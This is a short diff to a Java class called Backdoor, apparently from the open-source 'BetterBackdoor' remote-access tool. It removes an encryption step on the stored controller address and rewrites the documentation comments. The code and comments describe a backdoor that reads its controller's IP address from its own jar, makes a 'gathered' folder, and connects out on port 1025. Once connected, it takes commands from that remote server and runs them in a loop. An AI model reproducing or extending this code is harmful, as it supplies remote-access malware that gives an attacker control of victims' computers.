@@ -4,7 +4,6 @@ import java.io.File;
 import java.io.PrintWriter;
 import java.net.Socket;
 import java.util.Scanner;
-import com.github.thatcherdev.betterbackdoor.backend.Utils;
 
 public class Backdoor {
 
@@ -24,13 +23,16 @@ public class Backdoor {
 	}
 
 	/**
-	 * Uses {@link #readFromJar(String)} to get the contents of "ip", an encrypted
-	 * plain text file, inside the jar file this class is running from, with the
-	 * IPv4 address of the server. Creates directory "gathered".
+	 * Constructs a new Backdoor.
+	 * <p>
+	 * Uses {@link #readFromJar(String)} to get the contents of "ip", a text file
+	 * inside the jar file this class will be running from. This file contains the
+	 * IPv4 address of the server to be used to control the backdoor. Sets
+	 * {@link #ip} to this address. Creates directory "gathered".
 	 */
 	private Backdoor() {
 		try {
-			ip = Utils.crypt(readFromJar("/ip"), "BetterBackdoorIP");
+			ip = readFromJar("/ip");
 			new File("gathered").mkdir();
 		} catch (Exception e) {
 			System.exit(0);
@@ -38,14 +40,12 @@ public class Backdoor {
 	}
 
 	/**
-	 * Starts backdoor shell.
+	 * Starts backdoor.
 	 * <p>
-	 * Attempts to connect to server with {@link ip} on port 1025. Once connected,
-	 * initiates {@link in} and {@link out} and starts infinite loop that gets
-	 * command from server with {@link in} and handles command with
-	 * {@link HandleCommand#handle(String command)}. If exception is thrown,
-	 * {@link socket}, {@link in}, and {@link out} are closed and {@link #start()}
-	 * is run.
+	 * Attempts to connect to the server with the ip address {@link #ip} on port
+	 * 1025. Once connected, starts a loop that continuously gets commands from the
+	 * server and handles commands with
+	 * {@link HandleCommand#handle(String command)}.
 	 */
 	private void start() {
 		try {
@@ -79,11 +79,11 @@ public class Backdoor {
 	}
 
 	/**
-	 * Gets the contents of the file with name {@link filename} from inside the jar
-	 * file this class is running from.
+	 * Gets the contents of the file with the name {@link filename} from inside the
+	 * jar file this class will be running from.
 	 * 
-	 * @param filename name of file
-	 * @return contents of file with name {@link filename}
+	 * @param filename name of the file to get contents of
+	 * @return contents of the file
 	 */
 	private String readFromJar(String filename) {
 		String ret = null;
